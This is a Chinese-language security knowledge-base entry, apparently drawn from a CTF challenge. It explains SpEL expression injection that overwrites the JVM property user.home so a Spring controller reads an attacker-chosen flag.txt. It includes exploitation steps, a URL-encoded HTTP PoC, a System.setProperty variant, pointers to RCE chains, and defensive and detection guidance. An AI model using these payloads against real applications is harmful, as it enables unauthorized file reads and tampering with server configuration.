---
id: web-java-expression-spel-systemproperties-user-home-file-read
title: SpEL 注入改写 systemProperties['user.home']：重定向应用读取路径实现任意文件读取
type: scenario
domain: web
path: web/java/expression/spel
technique: spel-systemproperties-user-home-path-redirect
aliases:
- '#systemProperties'
- user.home
- SpEL 任意文件读取
- bbjv
tags:
- web
- java
- spel
- expression-injection
- system-properties
- file-read
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V202
  verified_at: '2026-11-07T02:02:51+08:00'
  notes: 已对照原文与图 27-28 核对：evaluateService.evaluate(rule)、System.getProperty('user.home')+flag.txt、payload 改 /tmp 后读到 flag 一致；未复跑目标。
---

## 一句话结论

`/check?rule=` 把用户输入直接交给 SpEL 求值；`#{#systemProperties['user.home']='/tmp'}` 会把 JVM 全局系统属性 `user.home` 改成 `/tmp`，随后控制器用 `System.getProperty("user.home")` 拼出 `flag.txt` 路径并读取，于是把“固定读 `user.home/flag.txt`”变成可控路径读取，直接拿到 `/tmp/flag.txt`。

## 原理

- Spring/Thymeleaf 等 SpEL 上下文可能暴露 `#systemProperties`（`System.getProperties()` 的 Map 视图）；对 Map 的赋值会调用 `System.setProperty`，修改的是整个 JVM 的全局属性。
- 控制器逻辑：`new File(System.getProperty("user.home"), "flag.txt")` 再读取内容并回显；它信任 `user.home` 指向当前用户目录。
- 攻击者把 `user.home` 改为任意目录（如 `/tmp`），应用随后读取 `/<dir>/flag.txt`；如果目标目录有可读的 flag/敏感文件，即实现任意文件读取（受文件名固定为 `flag.txt` 的限制）。
- 该原语也可用于修改 `java.io.tmpdir`、`user.dir` 等路径属性，影响日志、临时文件、模板加载等下游逻辑。

## 触发条件

- 存在 SpEL 注入点：参数直接进入 `SpelExpressionParser.parseExpression(...).getValue(...)`，未使用 `SimpleEvaluationContext` 等受限上下文。
- SpEL 上下文暴露 `#systemProperties` 或等价可写 Map；或者能通过 `@systemProperties`/反射访问 System 属性。
- 应用后续用该属性拼接文件路径并读取/回显，且目标文件可读。
- 目标进程对要读取的目录有读权限。

## 利用步骤

1. 确认 `rule` 参数被 SpEL 求值（可先注入 `#{7*7}` 观察回显/报错）。
2. 发送 `rule=#{#systemProperties['user.home']='/tmp'}`（URL 编码为 `%23%7B%23systemProperties%5B%27user.home%27%5D%3D%27%2Ftmp%27%7D`）。
3. 观察应用读取 `/tmp/flag.txt` 并回显；若 flag 在其它目录，改成对应目录。
4. 若一次请求后属性未生效，检查是否每次请求新建 JVM/上下文；可把赋值与读取放在同一表达式，或用 `T(java.lang.System).setProperty('user.home','/tmp')`。
5. 若只能读固定文件名，结合目录遍历/软链接/日志路径进一步利用。

## PoC

```http
GET /check?rule=%23%7B%23systemProperties%5B%27user.home%27%5D%3D%27%2Ftmp%27%7D HTTP/1.1
Host: target
```

解码后：`#{#systemProperties['user.home']='/tmp'}`。

## 变体与关联

- **SpEL 改属性绕过限制**：Spring Cloud Gateway 相关卡利用 `@systemProperties` 关闭限制性属性访问器，再读写配置；见 [[web-java-expression-spel-spring-cloud-gateway-property-write-env-h2-rce]]、[[web-java-expression-spel-spring-cloud-gateway-property-method-chain]]。
- **SpEL 命令执行**：若上下文允许 `T(java.lang.Runtime)` 或 `ProcessBuilder`，可直接 RCE；见 [[web-java-expression-spel-injection-to-rce]]。
- **其它全局属性**：`java.io.tmpdir` 影响临时文件落点，`user.dir` 影响相对路径解析，`logging.config` 可加载恶意配置。
- **文件读取链**：改属性只是改变路径前缀；若目标提供任意文件名参数，可直接读任意文件。

## 检测与防御

- 使用 `SimpleEvaluationContext`（只读、受限）而非 `StandardEvaluationContext`；禁止 `#systemProperties`、`T(...)`、反射访问。
- 不要用可变的全局系统属性拼接安全敏感路径；使用固定配置/规范化路径并做白名单。
- 审计 SpEL 入口（参数、模板、规则引擎），对 `#{...}`/`${...}` 输入做过滤与告警。
- 检测：请求中出现 `systemProperties`、`user.home`、`setProperty`、`T(java.lang.System)` 等关键字；进程系统属性在运行期被异常修改。
